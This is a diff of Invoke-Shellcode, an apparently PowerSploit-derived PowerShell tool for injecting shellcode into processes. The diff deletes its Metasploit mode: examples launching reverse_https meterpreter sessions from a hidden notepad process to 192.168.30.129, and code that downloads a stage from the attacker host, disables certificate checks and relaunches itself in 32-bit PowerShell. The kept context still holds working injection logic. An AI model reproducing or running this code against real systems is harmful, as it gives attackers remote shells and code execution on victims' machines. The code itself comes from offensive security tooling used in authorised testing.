@@ -29,34 +29,6 @@ Process ID of the process you want to inject shellcode into.
 
 Specifies an optional shellcode passed in as a byte array
 
-.PARAMETER ListMetasploitPayloads
-
-Lists all of the available Metasploit payloads that Invoke-Shellcode supports
-
-.PARAMETER Lhost
-
-Specifies the IP address of the attack machine waiting to receive the reverse shell
-
-.PARAMETER Lport
- 
-Specifies the port of the attack machine waiting to receive the reverse shell
-
-.PARAMETER Payload
-
-Specifies the metasploit payload to use. Currently, only 'windows/meterpreter/reverse_http' and 'windows/meterpreter/reverse_https' payloads are supported.
-
-.PARAMETER UserAgent
-
-Optionally specifies the user agent to use when using meterpreter http or https payloads
-
-.PARAMETER Proxy
-
-Optionally specifies whether to utilize the proxy settings on the machine.
-
-.PARAMETER Legacy
-
-Optionally specifies whether to utilize the older meterpreter handler "INITM". This will likely be removed in the future. 
-
 .PARAMETER Force
 
 Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.
@@ -79,76 +51,12 @@ Inject shellcode into the running instance of PowerShell.
 
 .EXAMPLE
 
-C:\PS> Start-Process C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
-C:\PS> $Proc = Get-Process notepad
-C:\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbose
-
-VERBOSE: Requesting meterpreter payload from https://192.168.30.129:443/INITM
-VERBOSE: Injecting shellcode into PID: 4004
-VERBOSE: Injecting into a Wow64 process.
-VERBOSE: Using 32-bit shellcode.
-VERBOSE: Shellcode memory reserved at 0x03BE0000
-VERBOSE: Emitting 32-bit assembly call stub.
-VERBOSE: Thread call stub memory reserved at 0x001B0000
-VERBOSE: Shellcode injection complete!
-
-Description
------------
-Establishes a reverse https meterpreter payload from within the hidden notepad process. A multi-handler was set up with the following options:
-
-Payload options (windows/meterpreter/reverse_https):
-
-Name      Current Setting  Required  Description
-----      ---------------  --------  -----------
-EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
-LHOST     192.168.30.129   yes       The local listener hostname
-LPORT     443              yes       The local listener port
-
-.EXAMPLE
-
-C:\PS> Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 80
-
-Description
------------
-Establishes a reverse http meterpreter payload from within the running PwerShell process. A multi-handler was set up with the following options:
-
-Payload options (windows/meterpreter/reverse_http):
-
-Name      Current Setting  Required  Description
-----      ---------------  --------  -----------
-EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
-LHOST     192.168.30.129   yes       The local listener hostname
-LPORT     80               yes       The local listener port
-
-.EXAMPLE
-
 C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
     
 Description
 -----------
 Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
 Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
-    
-.EXAMPLE
-
-C:\PS> Invoke-Shellcode -ListMetasploitPayloads
-    
-Payloads
---------
-windows/meterpreter/reverse_http
-windows/meterpreter/reverse_https
-
-.NOTES
-
-Use the '-Verbose' option to print detailed information.
-
-Place your generated shellcode in $Shellcode32 and $Shellcode64 variables or pass it in as a byte array via the '-Shellcode' parameter
-
-Big thanks to Oisin (x0n) Grehan (@oising) for answering all my obscure questions at the drop of a hat - http://www.nivot.org/
-
-.LINK
-
-http://www.exploit-monday.com
 #>
 
 [CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
@@ -161,63 +69,11 @@ http://www.exploit-monday.com
     [Byte[]]
     $Shellcode,
     
-    [Parameter( ParameterSetName = 'Metasploit' )]
-    [ValidateSet( 'windows/meterpreter/reverse_http',
-                  'windows/meterpreter/reverse_https',
-                  IgnoreCase = $True )]
-    [String]
-    $Payload = 'windows/meterpreter/reverse_http',
-    
-    [Parameter( ParameterSetName = 'ListPayloads' )]
-    [Switch]
-    $ListMetasploitPayloads,
-    
-    [Parameter( Mandatory = $True,
-                ParameterSetName = 'Metasploit' )]
-    [ValidateNotNullOrEmpty()]
-    [String]
-    $Lhost = '127.0.0.1',
-    
-    [Parameter( Mandatory = $True,
-                ParameterSetName = 'Metasploit' )]
-    [ValidateRange( 1,65535 )]
-    [Int]
-    $Lport = 8443,
-    
-    [Parameter( ParameterSetName = 'Metasploit' )]
-    [ValidateNotNull()]
-    [String]
-    $UserAgent = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent',
-
-    [Parameter( ParameterSetName = 'Metasploit' )]
-    [ValidateNotNull()]
-    [Switch]
-    $Legacy = $False,
-
-    [Parameter( ParameterSetName = 'Metasploit' )]
-    [ValidateNotNull()]
-    [Switch]
-    $Proxy = $False,
-    
     [Switch]
     $Force = $False
 )
 
     Set-StrictMode -Version 2.0
-    
-    # List all available Metasploit payloads and exit the function
-    if ($PsCmdlet.ParameterSetName -eq 'ListPayloads')
-    {
-        $AvailablePayloads = (Get-Command Invoke-Shellcode).Parameters['Payload'].Attributes |
-            Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
-    
-        foreach ($Payload in $AvailablePayloads.ValidValues)
-        {
-            New-Object PSObject -Property @{ Payloads = $Payload }
-        }
-        
-        Return
-    }
 
     if ( $PSBoundParameters['ProcessID'] )
     {
@@ -339,12 +195,12 @@ http://www.exploit-monday.com
 
         if ($64bitCPU) # Only perform theses checks if CPU is 64-bit
         {
-            # Determine is the process specified is 32 or 64 bit
+            # Determine if the process specified is 32 or 64 bit
             $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
             
             if ((!$IsWow64) -and $PowerShell32bit)
             {
-                Throw 'Unable to inject 64-bit shellcode from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work.'
+                Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
             }
             elseif ($IsWow64) # 32-bit Wow64 process
             {
@@ -519,6 +375,7 @@ http://www.exploit-monday.com
 
     # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
     $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
+
     if ($IsWow64ProcessAddr)
     {
     	$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
@@ -540,127 +397,7 @@ http://www.exploit-monday.com
         $PowerShell32bit = $false
     }
 
-    if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
-    {
-        if (!$PowerShell32bit) {
-            # The currently supported Metasploit payloads are 32-bit. This block of code implements the logic to execute this script from 32-bit PowerShell
-            # Get this script's contents and pass it to 32-bit powershell with the same parameters passed to this function
-
-            # Pull out just the content of the this script's invocation.
-            $RootInvocation = $MyInvocation.Line
-
-            $Response = $True
-        
-            if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you want to launch the payload from x86 Powershell?",
-                   "Attempt to execute 32-bit shellcode from 64-bit Powershell. Note: This process takes about one minute. Be patient! You will also see some artifacts of the script loading in the other process." ) ) ) { }
-        
-            if ( !$Response )
-            {
-                # User opted not to launch the 32-bit payload from 32-bit PowerShell. Exit function
-                Return
-            }
-
-            # Since the shellcode will run in a noninteractive instance of PowerShell, make sure the -Force switch is included so that there is no warning prompt.
-            if ($MyInvocation.BoundParameters['Force'])
-            {
-                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation"
-                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation)`n`n"
-            }
-            else
-            {
-                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation -Force"
-                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation) -Force`n`n"
-            }
-
-            $CommandBytes = [System.Text.Encoding]::Ascii.GetBytes($Command)
-            $EncodedCommand = [Convert]::ToBase64String($CommandBytes)
-
-            $Execute = '$Command' + " | $Env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command -"
-            Invoke-Expression -Command $Execute | Out-Null
-
-            # Exit the script since the shellcode will be running from x86 PowerShell
-            Return
-        }
-        
-        $Response = $True
-        
-        if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
-               "About to download Metasploit payload '$($Payload)' LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
-        
-        if ( !$Response )
-        {
-            # User opted not to carry out download of Metasploit payload. Exit function
-            Return
-        }
-        
-        switch ($Payload)
-        {
-            'windows/meterpreter/reverse_http'
-            {
-                $SSL = ''
-            }
-            
-            'windows/meterpreter/reverse_https'
-            {
-                $SSL = 's'
-                # Accept invalid certificates
-                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$True}
-            }
-        }
-        
-        if ($Legacy) 
-        {
-            # Old Meterpreter handler expects 'INITM' in the URI in order to initiate stage 0
-            $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
-            Write-Verbose "Requesting meterpreter payload from $Request"
-        } else {
-
-            # Generate a URI that passes the test
-            $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {[Char]$_}
-            $SumTest = $False
-
-            while ($SumTest -eq $False) 
-            {
-                $GeneratedUri = $CharArray | Get-Random -Count 4
-                $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
-            }
-
-            $RequestUri = -join $GeneratedUri
-
-            $Request = "http$($SSL)://$($Lhost):$($Lport)/$($RequestUri)" 
-        }
-           
-        $Uri = New-Object Uri($Request)
-        $WebClient = New-Object System.Net.WebClient
-        $WebClient.Headers.Add('user-agent', "$UserAgent")
-        
-        if ($Proxy)
-        {
-            $WebProxyObject = New-Object System.Net.WebProxy
-            $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
-            
-            # if there is no proxy set, then continue without it
-            if ($ProxyAddress) 
-            {
-            
-                $WebProxyObject.Address = $ProxyAddress
-                $WebProxyObject.UseDefaultCredentials = $True
-                $WebClientObject.Proxy = $WebProxyObject
-            }
-        }
-
-        try
-        {
-            [Byte[]] $Shellcode32 = $WebClient.DownloadData($Uri)
-        }
-        catch
-        {
-            Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
-        }
-        [Byte[]] $Shellcode64 = $Shellcode32
-
-    }
-    elseif ($PSBoundParameters['Shellcode'])
+    if ($PSBoundParameters['Shellcode'])
     {
         # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
         # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
